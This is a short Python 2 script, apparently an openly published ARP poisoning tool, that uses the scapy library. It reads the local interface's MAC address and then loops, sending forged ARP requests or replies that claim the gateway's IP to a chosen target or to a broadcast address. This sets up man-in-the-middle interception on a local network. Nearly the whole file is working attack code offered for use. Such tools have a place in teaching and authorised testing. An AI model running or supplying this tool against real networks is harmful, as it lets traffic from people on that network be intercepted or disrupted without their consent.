#!/usr/bin/env python

###############################################################################
# ARP Poisoning tool
#
# Maintainer: SIDNEY RDC - sydney.rdc@gmail.com
# Last Change: 2015 Abr 11 23:11:55
# Info: ARP poisoning tool using scapy library
# Source: http://www.arppoisoning.com/demonstrating-an-arp-poisoning-attack/
###############################################################################

import logging
import argparse
import time
import fcntl
import socket
import struct

# suppress scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

# return the mac address to 'ifname' interface
def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
    return ':'.join(['%02x' % ord(char) for char in info[18:24]])

# main code
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='arpspoof.py - ARP Poisoning Tool')
    parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='Name of network device interface')
    parser.add_argument('-t', '--target', dest='target', type=str, required=False, help='Target\'s IP to ARP poisoning')
    parser.add_argument('-r', '--host', dest='host', type=str, required=True, help='Gateway\'s IP')
    parser.add_argument('-m', '--mode', dest='mode', type=int, required=False, help='Mode of operation (1=request 2=reply)')
    args = parser.parse_args()

    # verify the mode arg
    if args.mode != None:
        mode = args.mode
    else:
        mode = 1

    # verify the target arg
    if args.target != None:
        target = args.target
    else:
        target = '192.168.88.255'

    # get mac address to network interface
    mac_addr = getHwAddr(args.interface)

    # create the arp package
    arp = ARP(op=mode, psrc=args.host, pdst=target, hwdst=mac_addr);

    # loop to send packages
    while 1:
        try:
            if mode == 1:
                print 'asking who has %s (as %s)' % (target,args.host)
            elif mode == 2:
                print 'reply to %s that %s is at %s' % (target,args.host,mac_addr)
            send(arp)
            time.sleep(2)
        except KeyboardInterrupt:
            print 'Finish!'
            break

